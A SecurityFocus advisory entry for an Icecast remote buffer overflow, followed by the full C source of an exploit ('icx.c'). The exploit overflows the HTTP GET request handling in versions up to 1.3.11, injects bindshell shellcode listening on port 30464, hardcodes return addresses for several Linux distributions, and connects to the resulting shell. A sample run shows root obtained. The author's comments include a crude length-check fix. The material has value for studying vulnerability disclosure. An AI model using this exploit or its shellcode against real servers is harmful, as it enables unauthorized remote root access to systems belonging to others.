source: http://www.securityfocus.com/bid/4415/info

Icecast is a freely available, open source streaming audio server. Icecast is available for the Unix, Linux, and Microsoft Windows platforms.

Icecast does not properly check bounds on data sent from clients. Because of this, it is possible for a remote user to send an arbitrarily long string of data to the server, which could result in a stack overflow, and the execution of user supplied code. The code would be executed with the privileges of the Icecast server. 

/*  all content is (c) #temp 2002 and may not be
 *  (re)published in any form or (re)distributed 
 *  without written permission of the author (diz) 
 *
 * 
 * 	icx.c -- icecast remote shell/root  
 *
 *
 * Found 15-02-2002...exploited 16-02-2002 ;P	
 *
 * Affected:
 *  all versions up to 1.3.11 (current) 
 * 
 * the client_login() function is passed the full GET %s HTTP/1.0
 * string provided by a mp3 client. Somewhere along the way an evil 
 * string function overflows buffer bounds with our humpage.. We can 
 * overflow just enough to reach and overwrite an instruction pointer. 
 * Humpage occurs somewhere in the handling of the request string
 * between mount searching and request building...Havent been able
 * to locate the exact spot as of yet (just discovered bug yesterday 
 * investigating another possible overflow in icecast extract_vars() 
 * funtion) Also some libavl routines look mighty guilty..especially 
 * avl_destroy. I cant really be bothered to check all entry points. 
 *
 * This is why:
 *
 * root@blackout:/home/diz/audits/icecast-1.3.11/src > grep strcpy all.c | wc -w
 *    284
 * root@blackout:/home/diz/audits/icecast-1.3.11/src > grep sprintf all.c | wc -w
 *    568
 * root@blackout:/home/diz/audits/icecast-1.3.11/src > grep strcat all.c | wc -w
 *     68
 * root@blackout:/home/diz/audits/icecast-1.3.11/src >                    
 *
 *
 * A quick and dirty patch is to check and make sure the length of expr does not
 * surpass 8000 bytes ala in client_login() in /src/client.c and recompile:
 * 
 * // dirty fix
 * if(strlen(expr) > 8000) 
 *	return;
 * // end of dirty fix
 *
 * What can we do:
 *
 * We can either overwrite a framepointer and make the process pop an 
 * instruction pointer out of memory we control. Or overflow eip directly. 
 * 
 * We go for the direct eip hump(tm)
 *
 * For framepointer humpage:
 *
 * Finding the address to overflow ebp with to make esp
 * point into the start of our buffer is easy..just gdb the
 * target platform icecast binary and set a breakpoint in
 * the client_login() function..output will be like this
 *
 * ...
 *  Breakpoint 1, 0x804af49 in client_login (con=0x808d0f0, expr=0xbf3fdaf4
 *  "GET ", 'x' <repeats 196 times>...) at client.c:97
 *  97      void client_login(connection_t *con, char *expr)
 * ...
 *
 * expr is a pointer to our original string..so we know that
 * is the start of our string in memory. Luck would have it we can just 
 * use that exact address and with pop incrementing it works out
 * to be correct and point to the start of our eip bytes :)
 * or into nops on a normal overflow. (which we will be doing)
 *
 * !!! Attention:
 *
 * When we just go for eip in one go we also need this address because
 * icecast will only give us one go :( so we can't offset and brute it
 * allthough we CAN pad with 7000+ nops..so finding a decent one go
 * compromise shouldnt be that much of a problem :)
 *
 * 			diz - #temp
 *
 * special word to pip and blink for helping me gather expr addresses
 * 
 * word to: eric, n0b0dy, muska, alcapone, sj, primalux, vonguard
 * 		khromy, jesse666 and r0ss
 * 
 * !!! A big "we hope leprosy strikes thee down!" to 2600.net !!!
 *
 * to compile standard overflow sploit: gcc icx.c -o icx 
 * to compile framepointer overflow sploit: gcc icx.c -o icx -DFPO
 *
 * note: for practical exploit usage just use standard mode
 * framepointer bits are left in cuz Im toying with them
 *
 * 	this version is meant for linux x86 targets 
 *
 *     PATCHES!?!?! WE DON'T NEED NO STINKIN PATCHES!!!
 */

/*

root@blackout:/usr/local/icecast/bin > ./icecast
Icecast Version 1.3.11 Initializing...
Icecast comes with NO WARRANTY, to the extent permitted by law.
You may redistribute copies of Icecast under the terms of the
GNU General Public License.
For more information about these matters, see the file named COPYING.
Starting thread engine...
[16/Feb/2002:15:39:33] Icecast Version 1.3.11 Starting..
[16/Feb/2002:15:39:33] Starting Admin Console Thread...
-> [16/Feb/2002:15:39:33] Starting main connection handler...
-> [16/Feb/2002:15:39:33] Listening on port 8000...
-> [16/Feb/2002:15:39:33] Listening on port 8001...
-> [16/Feb/2002:15:39:33] Using 'blackout' as servername...
-> [16/Feb/2002:15:39:33] Server limits: 900 clients, 900 clients per 
source, 10 sources, 5 admins
-> [16/Feb/2002:15:39:33] WWW Admin interface accessible at 
http://blackout:8000/admin
-> [16/Feb/2002:15:39:33] Starting Calender Thread...
-> [16/Feb/2002:15:39:33] Starting UDP handler thread...
-> [16/Feb/2002:15:39:33] Starting relay connector thread...
-> -> [16/Feb/2002:15:39:33] [Bandwidth: 0.000000MB/s] [Sources: 0] 
[Clients: 0] [Admins: 1] [Uptime: 0 seconds]
-> 

// this was a target compiled from source on my machine

diz@blackout:~/code/dizcode > ./icx -h blackout -p 8000 -b 0xbf3fdaf4 -a 1 
[ icx -- icecast humpage -- diz (#temp) ]
! resolving server: blackout
! compiled as standard overflow version
! using 0xbf3fdb58 as eip address
! sending string
! giving remote time to setup shop...zzz
! attempting to connect to bindshell
! connected to remote shell :)
$ id
uid=0(root) gid=0(root) groups=0(root),1(bin),14(uucp),15(shadow),16(dialout),17(audio),33(video),65534(nogroup)
$ exit
! done
diz@blackout:~/code/dizcode > 

*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <errno.h>

#define ALLIGN	0
#define NOP	0x90

#define STRING 	"GET %s%s HTTP/1.0\n\n" 

char allignbuf[4]; 
char outbuf[8206]; 
char nopbuf[512]; 

#ifdef FPO
char humpbuf[8182]; // 8181 bytes to hit ebp
#else
char humpbuf[8186]; // 8185 bytes to overwrite ebp and eip ( minus 4 for BSD hosts)
#endif

char code[] = 
	// taeho oh bindshell code -- binds to port 30464
	"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"
  	"\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"
  	"\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"
  	"\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"
  	"\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"
  	"\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"
  	"\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"
  	"\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"
  	"\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"
  	"\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"
  	"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
  	"\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff";


struct info {
	char *host;
	char *ip;
	int port;
	int allign;
	u_long address;
} icx;

void type(int type);
void handleshell(int sock);

int main(int argc, char **argv)
{
	struct sockaddr_in slut;
	struct hostent *ip;
	int s, b, len = 0, i;
	u_int w[4], eip[4];
	char *temp, c;	
	
	if(argc == 1) {
		fprintf(stderr, "Usage: %s -h <host> -p <icecast port> [ -t <type> ] OR [ -a <allign>  -b <address of *expr> ]\n", argv[0]);
		fprintf(stderr, "\nTypes are (linux version):\n\n");
		fprintf(stderr, "------------------------------------------------\n");
		fprintf(stderr, "(1) SuSE 7.2 icecast 1.3.10 (rpm)\n");
		fprintf(stderr, "(2) debian 2.2.r2 sid icecast 1.3.11 (deb)\n");
		fprintf(stderr, "(3) slackware 8.0.0 (?tta) icecast 1.3.11 (tgz)\n");
		fprintf(stderr, "------------------------------------------------\n\n");
		fprintf(stderr, "[  read comments on how to aquire new targets  ]\n\n");
		exit(1);
	}
	
	fprintf(stderr, "[ icx -- icecast humpage -- diz (#temp) ]\n");

	// default allign
	icx.allign = ALLIGN;
	
	
	while((c = getopt(argc, argv, "h:p:a:b:t:")) != EOF) {
		switch(c) {
			case 'h':
				icx.host = optarg;
				break;
			case 'p':
				icx.port = atoi(optarg);
				break;
			case 'b':
				sscanf(optarg, "%p", &temp);
				icx.address = (long)temp;
				break;
			case 'a':
				icx.allign = atoi(optarg);
				break;
			case 't':
				type(atoi(optarg));
				break;
			default:
				fprintf(stderr, "! huh ?\n");
				exit(1);
		}
	}
	
	fprintf(stderr, "! resolving server: %s\n", icx.host);

        if((ip = gethostbyname(icx.host)) == NULL) {
                perror("! gethostbyname");
                exit(1);
        }
	
	icx.ip = (char *)inet_ntoa(*((struct in_addr *)ip->h_addr));	

        s = socket(AF_INET, SOCK_STREAM, 0);
        slut.sin_family = AF_INET;
        slut.sin_port = htons(icx.port);
        slut.sin_addr.s_addr = inet_addr(icx.ip);
        memset(&(slut.sin_zero), '\0', 8);


	// setting overflow address

	#ifdef FPO

	icx.address += icx.allign;	
	
	#else
	
	icx.address += 100; // pointing into nops in *expr
	
	#endif 

	#ifdef FPO
	
	fprintf(stderr, "! compiled as frame pointer overflow version\n");
	fprintf(stderr, "! using 0x%lx as ebp address\n", icx.address);

	#else
	
	fprintf(stderr, "! compiled as standard overflow version\n");	
	fprintf(stderr, "! using 0x%lx as eip address\n", icx.address);
	
	#endif 
	
	// sort out overflow bytes
	w[0] = (icx.address & 0x000000ff);
        w[1] = (icx.address & 0x0000ff00) >> 8;
        w[2] = (icx.address & 0x00ff0000) >> 16;
        w[3] = (icx.address & 0xff000000) >> 24;
	
	
	// setting the eip address make sure it points into nops
	// allthough there are no nops to point into yet..behe
	
	#ifdef FPO
	
	icx.address += (16 + icx.allign + 100);
	
	fprintf(stderr, "! using 0x%lx as eip address\n", icx.address);
	
	// sort out eip pop bytes
	eip[0] = (icx.address & 0x000000ff);
        eip[1] = (icx.address & 0x0000ff00) >> 8;
        eip[2] = (icx.address & 0x00ff0000) >> 16;
        eip[3] = (icx.address & 0xff000000) >> 24;
	
	#endif

	// fill nop buffer
        memset(&nopbuf, '\0', sizeof(nopbuf));
        for(i = 0; i < sizeof(nopbuf); i++)
                nopbuf[i] = NOP;

	// allign
	memset(&allignbuf, '\0', sizeof(allignbuf));
	for(i = 0; i < icx.allign && i < sizeof(allignbuf); i++) 
		allignbuf[i] = 'x';
	
	memset(&humpbuf, '\0', sizeof(humpbuf));	

	#ifdef FPO
	
	// place eip read bytes 4 times
	for(i = 0, b = 0; i < 16; i++, b++) {
		if(b == 4) b = 0;
		humpbuf[i] = (char)eip[b];
	}
	
	// sprintf(&humpbuf[16], "%s%s", nopbuf, code);
	
	#else
	
	sprintf(&humpbuf[0], "%s%s", nopbuf, code);
	
	#endif
	
	// filling rest of string with garbage bytes
	// be sure to take the length of nops + shellcode
	// into account when the string contains them
	
	#ifdef FPO
	
	//! fp poop
	for(i = 16; i < (sizeof(humpbuf) - 1); i++)
		humpbuf[i] = 'x';
	
	#else
	
	// take length off shellcode and nops into account when we have some
	for(i = (strlen(nopbuf) + strlen(code)); i < (sizeof(humpbuf) - 1); i++)
                humpbuf[i] = 'x';
	
	#endif

	
	// making last 8 bytes overflow bytes (be it ebp..be it eip)
	humpbuf[sizeof(humpbuf) - 9] = (char)w[0];
        humpbuf[sizeof(humpbuf) - 8] = (char)w[1];
        humpbuf[sizeof(humpbuf) - 7] = (char)w[2];
        humpbuf[sizeof(humpbuf) - 6] = (char)w[3];

	humpbuf[sizeof(humpbuf) - 5] = (char)w[0];
	humpbuf[sizeof(humpbuf) - 4] = (char)w[1];
	humpbuf[sizeof(humpbuf) - 3] = (char)w[2];	
	humpbuf[sizeof(humpbuf) - 2] = (char)w[3];
	
	
	// connecting and going for the hump
	if(connect(s, (struct sockaddr *)&slut, sizeof(struct sockaddr)) == -1) {
		perror("! connect");
		exit(1);
	}
	else {
		memset(&outbuf, '\0', sizeof(outbuf));	
		snprintf(outbuf, sizeof(outbuf), STRING, allignbuf, humpbuf);
		
		#ifdef DEBUG
		for(i = 0; i < sizeof(outbuf); i++) 
			fprintf(stderr, "! byte %d [ 0x%x ]\n", i, outbuf[i]);
		#endif
		
		do {
			fprintf(stderr, "! sending string\n");
			len += send(s, outbuf, strlen(outbuf), 0);
		}
		while(len < strlen(outbuf));
		
		close(s);
	
		fprintf(stderr, "! giving remote time to setup shop...zzz\n");
		sleep(5);	
	
		fprintf(stderr, "! attempting to connect to bindshell\n");
		s = socket(AF_INET, SOCK_STREAM, 0);
		slut.sin_port = htons(30464);
		if(connect(s, (struct sockaddr *)&slut, sizeof(struct sockaddr)) == -1) {
                	perror("! connect");
			fprintf(stderr, "! check 30464 with nc in case target was slow\n");
                	exit(1);
		}
		else {
			fprintf(stderr, "! connected to remote shell :)\n");
			handleshell(s);
		}
        }
		
	fprintf(stderr, "! done\n");
	exit(0);
}
	
void type(int type)
{
	// suse 7.2 1.3.10 (rpm)
	if(type == 1) {
		icx.address = 0xbf3fdaf4;
		icx.allign = 0;
		return;
	}
	
	// debian 2.2.r2 sid 1.3.11 (deb)
	if(type == 2) {
		icx.address = 0xbeffdaf4;
		icx.allign = 0;
		return;
	}
	
	// slackware 8.0.0 (?tta) 1.3.11 (tgz)
	if(type == 3) {
		icx.address = 0xbeffdaf4;
                icx.allign = 0;
                return;
	}

	fprintf(stderr, "! type not found..exiting\n");
	exit(1);
}

		
void handleshell(int sock)
{
 	char inbuf[4096], outbuf[1024];

	fd_set fdset; 
	fprintf(stderr, "$ ");
     
	while(1) {        
	
		FD_ZERO(&fdset);
        	FD_SET(fileno(stdin), &fdset);
        	FD_SET(sock, &fdset);

		select(sock + 1, &fdset, NULL, NULL, NULL);

		if(FD_ISSET(fileno(stdin), &fdset)) {
			memset(outbuf, '\0', sizeof(outbuf));
			fgets(outbuf, sizeof(outbuf), stdin);
			if(strstr(outbuf, "exit") != NULL) {
				close(sock);
				return;
			}
			if(write(sock, outbuf, strlen(outbuf)) < 0) {
				fprintf(stderr, "! write error\n");
				return;
			}
		}

		if(FD_ISSET(sock, &fdset)) {
			memset(inbuf, '\0', sizeof(inbuf));
			if(read(sock, inbuf, sizeof(inbuf)) < 0) {
				fprintf(stderr, "! read error\n");
				return;
			}
			fputs(inbuf, stderr);
			fprintf(stderr, "$ ");
		}
	}
}
